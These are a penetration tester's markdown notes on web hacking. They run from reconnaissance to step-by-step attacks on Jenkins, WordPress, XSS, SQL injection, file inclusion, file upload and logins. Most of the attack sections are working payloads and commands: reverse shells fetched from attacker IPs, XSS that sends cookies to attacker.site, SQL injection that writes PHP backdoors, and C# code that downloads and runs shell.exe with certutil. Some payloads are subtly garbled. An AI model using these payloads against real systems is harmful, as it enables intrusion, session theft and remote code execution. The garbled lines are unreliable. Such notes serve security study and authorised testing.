# HTTP / HTTPS (web)

---

<br>


### 1) Information Gathering and Enumeration

> you need to find:
> - Programming language and frameworks used to build application
> - Web server software
> - Database software
> - Server operating information

**Target Information**:
- WHOIS lookup to get domain ownership details:
	- `whois <domain>` or online web app 
- DNS lookup to identify individual targets and IP addresses 
	- `nslookup <domain>` or `nslookup -querytype=ANY <domain>` 
- Netcraft to reveal a target's domain/subdomain can reveal the hosting provider, its IP netblock, servers, DNS information, and more
	- https://www.netcraft.com/ 

<br> 

**Fingerprint Infrastructure**:
- Netcraft to provide a web server analysis (web server version, name server, IP addresses, OS information, uptime stats, ownership details, host provider, etc.)
	- https://www.netcraft.com/
- Manual testing to find technologies used and HTTP header information:
	- `httprint`
	- [whatweb](https://github.com/urbanadventurer/WhatWeb)
		- `whatweb <ip_address|URL>`
	- [wappalyzer](https://wappalyzer.com/)
	- netcat:
		```bash
		$ nc <ip_address> 80
		> HEAD / HTTP/1.0
		>  
		... <HTTP_response> ...
		```
	- Burp Suite -- turn on proxy and Intercept and look at HTTP history tab for HTTP responses
	- [Shodan HQ](http://www.shodanhq.com/)
	- Firefox Web Developer *Network* Tool to view HTTP responses -- look for "Server" header

<br>

**Enumerating Subdomains**:
- Netcraft using the "subdomain matches" search option with `*.<domain>` 
- Google's advanced search operators 
	-  `site:.<domain>` -> `site:.<domain> -inurl:<already_found_domains>`
	-  i.e. `site:.microsoft.com` -> `site:.microsoft.com -inurl:www.`
-  [subbrute](https://github.com/TheRook/subbrute)
	- `python subbrute.py <domain>`  
	- to use custom wordlist: `python subbrute.py -s </path/to/wordlist> <domain>`
-  [dnsrecon](https://github.com/darkoperator/dnsrecon)
	-  to enumerate with Google: `dnsrecon -d <domain> -g`
	-  can use `--threads` option to speed up process
-  [theHarvester](https://github.com/laramies/theHarvester)
	-  `theharvester -d <domain> -b <data_source> -l <result_limit> -f <ouput_file>`
	-  i.e. `theharvester -d microsoft.com -b google -l 200 -f results.html`
-  zone transfer:
	-  with nslookup:
		```bash
		$ nslookup
		> server [NAMESERVER FOR mydomain.com]
		> ls -d mydomain.com
		```
		- and you can find `[NAMESERVER]` by running: `nslookup -type=NS mydomain.com`
	- with dig:
		- `dig @nameserver axfr mydomain.com`

<br>

**Finding Virtual Hosts**:
- with fierce:
	- `fierce -dns elearnsecurity.com`

<br>

**Fingerprinting Frameworks and Applications**:
- If common applications used, such as; forums (i.e. phpBB, vBulletin), CMS's (i.e. Joomla, Drupal), CRM's / blogging platforms (i.e. Wordpress, Moveable types), and social networking scripts:
	- find version and lookup vulnerabilities/exploits 
	- version can be found in web apps name, in web page content (footer), in HTML source code, or in HTTP headers
- If custom application, determine it's purpose and how it does it, and then map with Burp:
	- a) client side validation
	- b) database interaction 
	- c) file uploading and downloading 
	- d) display of user supplied data 
	- c) redirections 
		- i.e. inspect the `Location` header and look for 301/302 response codes
	- d) access controls and login protected pages 
	- e) error messages

<br>

**Enumerating Resources, Hidden Files, and User Accounts**:
- Automatically crawl the website with Burp Spider or manually crawl the website by configuring Burp and visiting all the links 
- Check for the "robots.txt" sitemap file (i.e. `curl https://site.com/robots.txt`)
- Look at source code for configurations and version information
- Find hidden files (i.e. backup files, configuration files, open directory listings, log files, etc.)
	- DirBuster GUI
	- GoBuster:
		- to search for directories: `gobuster dir -u <host> -w <wordlist>`
		- to search for files: `gobuster dir -u <host> -w <wordlist> -x php,jsp,html,js,txt,bak,old`
	- Dirb
		- i.e. to scan non-recursively with a 10 millisecond delay: `dirb http://site.com -r -z 10`
	- Feroxbuster
		- basic scan: `feroxbuster -u http://site.com`
		- file extnesion scan: `feroxbuster -u http://10.2.2.150 -x php,bak,conf,txt`
		- scanning HTTPS websites: `feroxbuster -u https://site.com -k`
		- scanning through a SOCKS proxy: `feroxbuster -u http://10.2.2.150 -x php,bak,conf,txt --proxy socks5://127.0.0.1:1080`
	- try the names of SMB shared found 
	- try common administration console directories (i.e. for Tomcat "/manager/html", for MySQL "/phpmyadmin", etc.)
- Look for user accounts on About/Employees page to use later for logins
- Look for writeable directories on the web server (allow you to upload files to)
	- look for directories with PUT verb allowed:
		```bash
		OPTIONS / HTTP/1.1
		Host: targetsite.com
		```
	- try to upload a file to these directories:
		```bash
		PUT /writeable_dir/test.html HTTP/1.1
		Content-length: 184
		<RETURN>

		[CONTENTS OF TEST.HTML]
		<RETURN>
		<RETURN>
		```
	- make sure `Content-length` is the size of `test.html` (payload) in bytes

<br>

**Vulnerability Scans**:
- nikto basic usage: `nikto -h <target>` 
- i.e. to halt scanning after a max time: `nikto -h http://site.com -maxtime=30s`

<br>

**Check for APIs**:
- 

--- 

### 2) Attacks 

<br>

### Exploiting Jenkins Server 
> Jenkins is an automation server that can be used to automate a number of tasks related to software development. In order to do this, Jenkins needs the ability to execute system commands, which can provide a path to code execution for a pentester. 

Enumeration:
- review the DOM (right click anywhere and select Inspect Element) -- look through the HTML source code and any included JS files
- run a directory enumeration tool (i.e. `dirb`, `gobuster`, `feroxbuster`)
- try default credentials (i.e. `admin:password`, `admin:admin`, etc.)

Exploitation:
- create a project that can execute commands:
	- a) select New Item -> enter a non-malicious sounding name (like "Access"), select "Freestyle project" and press Ok -> navigate to the Build configuration section (Build Triggers tab) -> select the Add build step (under Build) and select "Execute Windows batch command" from the dropdown menu 
	- b) when the Command text box appears, you can enter commands (like `whoami`) and press Save
	- c) Jenkins will then open the items main page where you can select Build Now to run the command
	- d) when the build is executed a new item will be displayed under Build History, where clicking on "#1" will open the build page 
	- e) from the build page, select Console Output to view the output of the command 
- create a project that executes a reverse shell:
	- a) create a reverse shell payload (this may need to be obfuscated with tools like `shellter` if AV is running on Jenkins server)
	- b) start a HTTP server on the attack machine 
		- i.e. `sudo python3 -m http.server 80`
	- c) in Jenkins redo steps before or click on the Access link at the top left of the screen within the breadcrumbs 
	- d) click Configure in the sidebar to open the configuration page, then change the Build command to a PowerShell download command
		- i.e. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/shell.exe', 'c:\Users\Public\shell.exe')`
	- e) stop the Python server and start a listener to catch the payload created 
	- f) in Jenkins, reconfigure the item to run the shell by setting the command to execute to the path of the downloaded binary and click Build Now 

<br>

### Exploiting Admin Consoles

Enumeration:
- find a web admin console directory (i.e. using dirb, gobuster, etc.)
- i.e. `dirb http://10.11.0.22 -r`
Exploitation:
- try to login -> try default username/password pairs, use enumerated information to guess working credentials, or attempt to brute force 
- i.e. brute force using Burp intruder:
	- a) send a login request to admin panel and capture with Intercept 
	- b) find the request in HTTP history, right-click, and press Send to Intruder
	- c) navigate to Positions tab and mark which values (payloads) you want to brute force (i.e. username, password, tokens, session ID, etc.)
	- d) select "Pitchfork" as the Attack type (to set a unique payload for each position)
	- e) for predefined payloads which need to be avalible for other requests (i.e. tokens, session ID, etc.), goto the Options tab, navigate to the "Grep - Extract" section ("Recursive Grep" payload) and click Add
	- f) use the HTTP response window to define the location fo the item you want to extract by clicking on the item in the response (i.e. a hidden form field), Burp will then automatically populate the "Start after expression" and "End at delimeter" field, and you can then press Ok
	- g) next, navigate to the Payloads tab and select the payloads you want to use for the Pitchfork attack at each position
		- for recurisve grep payloads select  "Recursive Grep" and copy across the "From ... to ..." rule created in step f
		- for passwords use the "Simple list" payload type to manually enter a list of passwords in or to Load a wordlist 
	- h) finally, clieck the Start attack button to initiate the brute force attack
- from within an admin console you can perform SQL queries to find credentials or create user accounts, upload files to get a reverse shell, etc.



#### WordPress

Enumeration:
- use wpscan to scan a wordpress site:
	- basic scan `wpscan --url <target>`
	- enumeration scan (all):  `wpscan --url <target> -e`
	- enumeration scan with specific options: `wpscan --url sandbox.local --enumerate ap,at,cb,dbe`
		- enumerate to include “All Plugins” (`ap`), “All Themes” (`at`), “Config backups” (`cb`), and “Db exports” (`dbe`) 
- search plugins and WordPress version for vulnerabilities:
	- i.e. `searchploit <~plugin_name>`
- if you find `xml-rpc.php` is active you can perform a credentials brute force:
	- use tool [WPXploit](https://github.com/relarizky/wpxploit)
	- i.e. `./exploit.py http://10.11.1.234/ 5 15`
Exploitation:
- use wpscan to brute force wordpress user logins:
	- `wpscan --url <target> -U <username> -P <password_list>`
- or login via MySQL and update admin password through backend database
- upload a PHP reverse shell to WordPress admin panel:
	- a) go to “Appearance > Editor > 404.php” and replace the PHP code with a [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
	- b) setup a netcat listener
	- c) then call the template: `http://<target>/wp-content/themes/<theme_name>/404.php`
- upload a WordPress plugin shell:
	- a) create a `.zip` file of the  `/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php` script 
		- i.e. `sudo zip plugin-shell.zip plugin-shell.php`
	- b) in the WordPress admin panel select the Plugins tab, click Add New, then press Upload Plugin and upload the `plugin-shell.zip` file created 
	- c) once uploaded, press Install Now -- this will extract the contents of the `.zip` file to a directory of the same name within the `wp-content/plugins` server (i.e. `wp-content/plugins/plugin-shell`)
	- d) send a `curl` request to the PHP shell and pass the `cmd` parameter to execute commands on the target system 
		- i.e. `curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami`
	- e) generate a shell using `msfvenom` 
		- i.e. `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf`
	- f) host a web server and download the shell from using WordPress shell 
		- `sudo python3 -m http.server 80`
		- i.e. `curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf`
		- use `%20` to encode spaces in URL
	- g) make the shell executable
		- i.e. `curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf`
	- h) setup a listener:
	```bash
	$ sudo msfconsole -q -x "use exploit/multi/handler;\
	> set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
	> set LHOST 10.11.0.4;\
	> set LPORT 443;\
	> run"
	```
	- i) execute the shell
		- i.e. `curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf`
		

<br>

#### XSS

**Finding XSS**:
- a) find where user-supplied data correlates to web app data output 
- b) inject either HTML, JavaScript, or special characters into the input (i.e. GET/POST variables, cookie variables, or HTTP headers) -- GET variables are the easiest because you can just send the victim a link 
	- special characters: `<`, `>`, `'`, `"`, `{`. `}`, `;` -- if an application doesn't remove or encode these characters it may be vulnerable to XSS
	- HTML: `<h1>` or `<plaintext>` tags
	- JavaScript: `<script>alert("xss");</script>` 
- c) submit the request and view the output, you may need to use the Firefox inspector tool to see the source code and if the characters were removed or encoded
- For Reflected XSS look for GET requests or HTTP headers, usually in search fields and results or anywhere user input is included in error messages
- For Persistent (stored) XSS look for blog posts or comment fields, usuallly in forum software

<br>

**Exploiting XSS**:
- For DOM XSS try to insert DOM-based JavaScript into XSS payload:
	- i.e. insert into web page `<img alt="" src="" onload="document.body.innerHTML='<h1>Defaced</h1>'";< />`
- For cookie stealing:
	- a) find URL vulnerable to XSS
		- i.e. `http://site.com/search.php?kw=`
	- b) insert a XSS payload which steals the cookie and sends it to attack:
		- i.e. `http://site.com/search.php?kw=<script>var i = new Image(); i.src="http://attacker.site/steal.php?q="%2document.cookie;`
		- the `%2` is the URL-encoded version of the `+` character
	- c) create the `steal.php` file on attacker web server:
		```php
		$fn="log.txt";
		$fh=fopen($fn, 'a');
		$cookie=$_GET['q'];
		fwrite($fh, $cookie);
		fclose($fh);
		```
	- d) send the link with the XSS payload to the victim (or to the website if vulnerable to Persistent XSS)
	- or you can use `<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>` as the payload, setup a netcat listener on the attack machine (`sudo nc -lvnp 80`), and then see the cookie when the client request is redirected to your attack machine
	- once you have a authenticated session ID from a cookie, you can use the Cookie-Editor Firefox extension to set and manipulate cookies for webpages you visit
		- i.e. visit webpage, click on Cookie-Editor icon, select Add button, paste in the stolen cookie values, and press Save -> now navigate to restricted webpages on the web app using the stolen cookie credentials
- For defacement:
	- i.e. `http://site.com/search.php?kw=<script>document.body.innerHTML='<h1>Defaced</h1>'";</script>`
- For phishing/malware:
	- i.e. alter the `action` parameter on forms to send data to attacker controlled server: `http://site.com/search.php?kw=script>document.forms[0].action="https://hacker.site/steal.php";`
- With BeEF:
	- a) start BeEF server on attacker machine
	- b) send link with BeEF XSS hook script to victim 
		- i.e. `http://site.com/search.php?kw=<script src="http://<attacker_ip>:80/hook.js"></script>`
- to redirect the victim to a webpage/attack machine:
	- i.e. `<iframe scr=http://10.11.0.4/report height="0" width="0"></iframe>`
	- then on attack machine setup a netcat listener with: `sudo nc -nlvp 80`
	- or redirect to a client-side exploit or information gathering script by, firstly, capturing the victim's User-Agent header to identify the browser version, and then sending them to a specific redirection address

<br>

#### SQLi
> https://guide.offsecnewbie.com/5-sql

**Finding SQL Injection Points**:
- Probe web application's input (i.e. HTTP headers, GET/POST requests, cookies) with characters that cause SQL syntax errors (i.e. `'`, `#`, `-`, `"`) and use error message to identify DBMS being used
- If no errors displayed then used "boolean based detection technique" to test for SQLi with payloads that return true/false:
	-  i.e. test for true payload: `http://site.com/user.php?id=99999999' or '1'='1'; -- -`
	-  i.e. test for false payload: `http://site.com/user.php?id=99999999' or '1'='2'; -- -`
	-  find if there is a noticeable difference in output between a true and false condition 

<br>

**Exploiting SQLi**:
> https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
> https://book.hacktricks.xyz/pentesting-web/nosql-injection
- Bypassing authentication:
	- a) find a login form on the web application
	- b) inject an SQL query which uses a valid username into the "username" field and returns True for the password field, limiting results returned to 1
		- i.e. `tom' or 1=1 LIMIT 1;#`
- Enumerating databases:
	- a) find a page on the web application which outputs data gathered from a backend database (i.e `http://site.com/shoes.php?id=33`)
	- b) test for SQLi (i.e. `http://site.com/shoes.php?id='` -- is an error generated?)
	- c) find the number of columns the SQL query returns by using the `order by` clause:
		- i.e. `http://site.com/shoes.php?id=1 order by 1` to sort the results based on the values in the first column (column index 1)
		- next, increment the column index (`http://site.com/shoes.php?id=1 order by 2`) and continue doing this until an error is generated, at which point you can deduce the maximum number of columns 
		- this process can be automated using Burp Suite's Repeater tool:
			- start Burp, launch the URL against the target, in Proxy > HTTP history then select the request made, right-click and Send to Repeater
			- then increment the Order By clause by 1 each time until an error is generated
	- d) use a Union statement to extract useful data:
		- begin by issuing a `union all select` followed by the number of columns you have found (i.e. `http://site.com/shoes.php?id=1 union all select _haswwhcol from informa_ 1, 2, 3`)
		- this will display the data from before with the values 1, 2, and 3 underneath and let you determine which fields are output (i.e. maybe just 2 (name) and 3 (comment)), from the SQL query
		- from here you can choice a value to substitute to extract database information from, i.e. if column 3 (comment) is shown then you can use this field to extract DB information as it will be show on the webpage 
	- e) extract data from the database:
		- once you known the number of columns and which are displayed, you can extract data from the database using DBMS specific syntax
		- for MariaDB you can extract the DB version using `@@version` (i.e. `http://site.com/shoes.php?id=1 union select 1, 2, @@version`)
		- to output the current DB user in MariaDB user `user()` (i.. `http://site.com/shoes.php?id=1 union select 1, 2, user()`)
		- to output table names use the `information_schema` table (i.e. `http://site.com/shoes.php?id=1 union select 1, 2, table_name from information_schema.tables`) -- this will include default MariaDB objects and tables names specific to the web application
		- i.e. to output columns from a specifc DB table: `http://site.com/shoes.php?id=1 union select 1, 2, column_name from information_schema.columns where table_name='users'`
		- i.e. to extract data from a table's columns: `http://site.com/shoes.php?id=1 union select 1, 2, username, password from users`
- Code injection through SQLi:
	- a) find a SQLi injection point (i.e. `http://site.com/shoes.php?id=1 union select 1, 2, 3`)
	- b) used DBMS functions to execute system commands on the system
		- in MariaDB use the `load_file()` function to read a local (i.e. `http://site.com/shoes.php?id=1 union select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`
		- use the `into OUTFILE` function to create a malicious PHP file in the server's web root (i.e. `http://site.com/shoes.php?id=1 union select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`)
			-  ignore the error message  and try the backdoor by passing `ipconfig` command: `http://site.com/backdoor.php?cmd=ipconfig`
- Extract data using in-band SQLi through UNION statements:
	- a) get number of fields in SQL query:
		- i.e. `http://site.com/user.php?id=99999999' UNION SELECT NULL; -- -` -> `http://site.com/user.php?id=99999999' UNION SELECT NULL, NULL; -- -` -> etc. 
	- b) get the type of fields in SQL query:
		-  try a varchar for first field `http://site.com/user.php?id=99999999' UNION SELECT 'a', NULL, ...; -- -` if there is an error then try `1` to see if integer 
		-  repeat for all `NULL` fields until you find all the field types 
	-  c) finally, extract data from the database: 
		-  i.e. to get the DBMS version: `http://site.com/user.php?id=99999999' UNION SELECT @@version, 'a', ...; -- -`
		-  for MSSQL you can inject `user_name()` to find out the user the database is running as or `db_name()` to print the current database being used   
-  Extract using error-based SQLi:
	-  a) inject SQL which causes an error to find DBMS type (MySQL, MSSQL, PostgreSQL, etc.)
	-  b) use the CAST technique to trigger type conversion errors:
		-  (see "eCPPT_notes.md")
- Automatically exploit SQLi with SQLMap:
	- basic syntax: `sqlmap -u <url> -p "<injection_parameter>" [options]`
		- i.e. to exploit in-band (union) SQLi and get banner info.: `sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U --banner`
	- to exploit the POST parameter: `sqlmap -u <url> --data=<post_string> -p <parameter> [options]`
		- i.e. to get banner info.:`sqlmap -u 'http://victim.site/login.php' --data='user=a&pass=a' -p user --technique=B --banner`
	- to use a request intercepted in Burp: `sqlmap -r <request_file> -p <parameter> [options]`
		- i.e. to get banner info.:`sqlmap -r /root/bloglogin.req -p user --technique=B --banner`
	- process of extracting data from GET SQLi in sqlmap:
		- a) find users: `sqlmap ... --users`
		- b) check if admin: `sqlmap ... --is-dba`
		- c) get a list of databases: `sqlmap ... --dbs`
		- d) get a list of tables in selected database: `sqlmap ... -D <database> --tables`
		- e) get a list of columns in selected table: `sqlmap ... -D <database> -T <table>`
		- f) dump data from list of columns in selected table: `sqlmap ... -D <database> -T <table> -C <column_list> --dump`
		- i.e. `sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U -D blogdb -T users -C username,password --dump`
	- extracting data from HTTP Header User-agent SQLi
		- i.e. `slqmap -u 'http://sql2.webapp.site/getBrowserInfo.php' --level=3 --techniques=B --keep-alive --dbs --dump`
	- extracting data from Blind POST SQLi:
		- `sqlmap -u 'http://sql1.webapp.site/login.php' --data='username=test&password=test&submit=Login' -p password --technique=B --suffix='; -- ' --level 2 --risk 3 --dbs`
	- to automatically upload and execute a remote command shell on the system use `--os-shell` option:
		- i.e. `sqlmap -u 'http://victim.site/view.php?id=1141' -p id --dbms=mysql --os-shell`
		
		
**Oracle Database**:
 > see [PayloadALLThings OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
- i.e. find number of fields `author=aaa' order by ...`
- i.e. find fields and their data types: `author=aaa' union all select 'abc', 'eee', 1 FROM dual --`
- i.e. find table names: `author=aaa' union all select 'abc', table_name, 1 from all_tables --`
- i.e. find column names:  `author=aaa' union all select 'abc', column_name FROM all_tab_columns WHERE table_name = 'WEB_ADMINS' --`
- i.e. get table information: `author=aaa' union all select ADMIN_NAME, PASSWORD, 1 from WEB_ADMINS --` 


**Creating PHP command file through MySQL**
> -  https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/
> - https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql

You can inject PHP code into a file through MySQL DBMS functions:
- i.e. with a SQLi statement like `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -' `
- then you can run system commands by running `curl 'http://192.168.138.127:45332/command.php?cmd=dir'`


<br>

#### Session Hijacking

Session Hijacking via XSS:
- Need; XSS vulnerability, session ID is sent through cookies on each HTTP request, and cookies are readable by JavaScript
- Process:
	- a) find XSS 
	- b) craft payload and setup `steal.php` on attacker web server 
		```javascript
		<script>
			var i=new Image();
			i.src="http://attacker.site/steal.php?q="%2bdocument.cookie;
		</script>
		```
	- c) send XSS payload to victim
	- d) install cookie on attacker machine to gain access to session

<br>

Session Hijacking via Packet Sniffing:
- Need; access to victim traffic (through same LAN or compromised gateway) and unencrypted HTTP traffic 
- Process:
	- a) sniff victim traffic, "Follow TCP Stream" in Wireshark, and read cookies
	- d) install cookie on attacker machine to gain access to session

<br>

Session Hijacking via Direct Server Access:
- Process:
	- a) compromise web server
	- b) find session data on web server
		- for PHP look in `php.ini` file under the `session.save_path` entry and in files named `sess_<sessionID>`
		- for Tomcat, by default, sessions are stored in the `SESSIONS.ser` file 
	- c) install cookie on attacker machine to gain access to session

<br>

Session Fixation Attack:
- Generally, only works for custom apps which who don't regenerate session IDs after logins and the session ID is propagated (i.e. via URL or JavaScript)
- Process:
	- a) obtain a valid session ID
		- i.e. visit web server and get a generic session ID
	- b) force the victim to use this session ID to establish a personal session with the web server 
		- i.e. send the victim a link with the generic session ID you obtained (`http://victim.site/login.php?SID=300`)
	- c) use the session ID you send to the victim to gain gain access to their logged in session on the attacker machine

<br>

#### CSRF 

Finding CSRF:
- ...

<br>

Exploiting CSRF:
- a) create a payload to force the victim to execute a request on attacker's behalf:
- b) send payload (i.e. as link) to victim or store payload (i.e. as onload function) as Persistent XSS on web server 
	- i.e. as link to send money to an attacker: `http://csrf.webapp.site/startCreditTransfer.php?amount=100&accountNumber=99999999992&swift=B4F15S6S`
	- i.e. as embedded CSRF payload on web server:
		```html
		<div id="attackPoint" style="display:none;">
			<img src="http://csrf.webapp.site/startCreditTransfer.php?amount=100&accountNumber=99999999992&swift=B4F15S6S" />
		</div>
		```

<br>

#### File and Resource Attacks

**Path/Directory Traversal Attacks**:
- Process:
	- a) find web app URL that uses parameters to define files/resources to display
		- i.e. `http://site.com/getFile.php?path=file123.pdf`
	- c) try to traverse the path specified in the parameter by modifying the value to reference a file that should be readable by any user on the system (i.e. `/etc/passwd` in Linux or `c:\boot.ini` in Windows)
		- i.e. `http://site.com/getFile?path=../../../etc/passwd`
	- if the web app is coded to append a terminating file extension to user-supplied input (i.e. `.pdf`), then append null byte (`%00`) to request  or append a question mark (`?`) to mark anything added to the URL server-side as part of the query string
		- i.e. `http://site.com/getFile?path=../../../etc/passwd%00`
	- if an error is returned it likely means the server is vulnerable to file inclusion as input is not sanitised and you just need to find a readable file -- error messages can reveal OS information and which directory the web app is located in
		- i.e. if host is running Windows you can update your payload with: `http://site.com/getFile?path=c:\windows\system32\drivers\etc\hosts`

<br>

**LFI**:
> Unlike directory traversals that simply display the contents of a file, file inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To exploit a file inclusion vulnerability you must be able to execute your code and write your shell payload somewhere. LFI occurs when the file is loaded from the same web server.
- Process:
	- a) find web app URL that users parameters to define files/resources to include on a web page:
		- i.e. `http://target.site/index.php?location=IT`
		- look for pages where you suspect an `include()` statement has been used
	- b) enter a path to a local file on the web server you want to execute :
		- i.e. `http://target.site/index.php?location=../uploads/shell.php`
		- may need to terminate the string with a null character (`%00`) if the PHP code expects a file extension or automatically appends one (i.e. `index.php?location=../uploads/shell.php`)  or append a question mark (`?`) to mark anything added to the URL server-side as part of the query string
- another way to inject code onto the server (if you cannot upload a reverse shell), is through log poisoning:
	- most application servers will log all URLs that are requested, so you can submit a request that includes PHP code which, when logged, can be used as your LFI payload
	- i.e. send the payload with netcat:
	```bash
	$ nc -nv 10.11.0.22 80
	...
	<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; ?>
	```
	- this request will generate a "Bad Request" error, but will be logged by the web application 
	- to then exploit the LFI vulnerability to execute this payload you can pass a system command to the "cmd" GET parameter you defined and execute the log file to generate the output of the system command run
	- i.e. `http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
	- this can be used to inject a full PHP reverse shell payload
- you can also inject code using PHP wrappers:
	- use can use the PHP `data` wrapper to embed inline data as part of the URL with plaintext or base64 encoded data
	- i.e. to inject "hello world" on a page vulnerable to LFI: `http://10.11.0.22/menu.php?file=data:text/plain,hello world`
	-  i.e. to inject an OS command on a page vulnerable to LFI: `http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`
- LFI wordlist of files to look for:
	- https://github.com/hussein98d/LFI-files/blob/master/list.txt
	- https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt
		
<br>

**RFI**:
> RFI is the similar to LFI, but occurs when a file is loaded from an external source. These are less common than LFIs as the server must be configured in a very specific way (i.e. allow_url_include must be set to "On", which is not the default in newer PHP versions), but are usually easier to exploit.
- Process:
	- a) find web app URL that users parameters to define files/resources to include on a web page:
		- i.e. `http://target.site/index.php?location=IT`
		- look for pages where you suspect an `include()` statement has been used
	- b) enter a path to a remote file stored on the attacker's server you want to include in the output:
		- first try google.com: `http://target.site/index.php?location=www.google.com`
		- if that works then try a file on attacker web server: `http://target.site/index.php?location=http://attacker.site/shell.txt`
		- may need to terminate the string with a null character (`%00`) if the PHP code expects a file extension or automatically appends one (i.e. `index.php?location=../../../etc/passwd%00`)  or append a question mark (`?`) to mark anything added to the URL server-side as part of the query string
	- c) before executing setup a netcat listener to catch the PHP reverse shell 
		- i.e. `sudo nc -nvlp 80`
- importantly, the file included must not have the `.php` extension, otherwise the code within the included file will run on the attacker machine, instead of the target web app 
- if suspected PHP include is being used, you can use Metasploit module:
	- a) find RFI vulnerability
	- b) `msfconsole` -> `use exploit/unix/webapp/php_include`
	- c) configure and set `PHPURI` to the path of the RFI vulnerability with "XXpathXX" set as the include parameter to be changed
		- i.e. `set PHPURI /index.php?page=XXpathXX`
	- d) run the exploit 
		- this exploit may generate a unstable shell so upload another Meterpreter shell (created using *msfvenom*) and execute this with: `execute -f shell.exe`, once you have a listener setup

<br>

**Unrestricted File Upload**:
- Process:
	- a) find a web page where you can upload files to the web app
	- b) find where where in the web app these files are uploaded to (the directory) and if they are renamed in a predictable manner
	- c) try uploading files:
		- first, see what type of file you can upload (i.e. `.txt`, `.jpeg`, etc.) by trying to upload various files 
		- next, see what filtering the web app does (i.e. client-side or server-side)
			- you can easily bypass client-side filtering using Burp to modify the client-side JavaScript or by submitting files directly with curl/wget
			- i.e. `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
		- next, try to bypass server-side filtering:
			- determine what file extensions are accepted to be uploaded 
			- see if you can upload a script by changing the magic number in the file
			- see if you can upload a script by changing the request's MIME type in Burp 
			- see if you can upload a script by changing the file size
- see my [upload vulns](https://github.com/Adam-Goss/pentest_notes/blob/master/web_hacking/upload_vulns.md) GitHub page for more details 

<br>

**Command Injection**:
> OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. More info [here](https://book.hacktricks.xyz/pentesting-web/command-injection).
- if a 


<br>

**NodeJS App**:
- if NodeJS is running on the backend (i.e. you see a MongoDB server running) then try to inject JS code instead of PHP code (i.e. `1+1`) to see if it is executed 
- if executed then use [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) reverse shell payload to get a shell on the system 

<br>

 **Microsoft Server with `site.master` File**:
 - if you cannot upload a `.aspx` or `.asp` file to a Microsoft web server, you can look to overwrite the `site.master` file
 - this file provides a template for every page on an ASP.NET MVC-style application, it often uses C# as a backend language, and resides in the web root
 - it can contain arbitrary code which will be executed and allows for RCE
 - process:
	 - a) check if you can upload files and that they are uploaded to the root web directory
	 - b) look for directories where you can find a `site.master.txt`, `site.master.bak`, etc. 
	 - c) append to the code you want to inject at the end of template and upload this as a new template
 - i.e. enumeration code to run:
	```c#
	<%
	string stdout = "";
	string cmd = "whoami";
	System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
	procStartInfo.RedirectStandardOutput = true;
	procStartInfo.UseShellExecute = false;
	procStartInfo.CreateNoWindow = true;
	System.Diagnostics.Process p = new System.Diagnostics.Process();
	p.StartInfo = procStartInfo;
	p.Start();
	stdout = p.StandardOutput.ReadToEnd();
	Response.Write(stdout);
	%>
	```
- i.e. code to download and execute shell on system:
	```c#
	<%
	string stdout = "";
	ArrayList commands = new ArrayList();
	commands.Add("certutil.exe -urlcache -split -f \"http://192.168.49.145:139/shell.exe\" \"C:\\inetpub\\wwwroot\\shell.exe\"");
	commands.Add("\"C:\\inetpub\\wwwroot\\shell.exe\"");
	foreach (string cmd in commands) {
		System.Threading.Thread.Sleep(3000);
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + cmd);
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.UseShellExecute = false;
		procStartInfo.CreateNoWindow = true;
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		stdout = p.StandardOutput.ReadToEnd();
		Response.Write(stdout);
	}
	%>
	```
	


<br>

#### Authentication Attacks

**Logins**:
- do default credentials work?
- can you bypass client-side checks with Burp?
- do you have and credentials to try?
- have you built a custom wordlist by crawling the website (see [[wordlists]])?
- try brute forcing HTTP form login with Hydra:
	- view usage: `hydra -U http-post-form`
	- i.e. `hydra 10.11.0.2 http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L usernames.txt -P passwords.txt -f -V`
	- i.e. a single "admin" user: `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
- try brute forcing htaccess-protected URL with Medusa:
	- usage: `medusa -h <host> -u <username> -P <password_list> -M http -m DIR:<protected_url>`
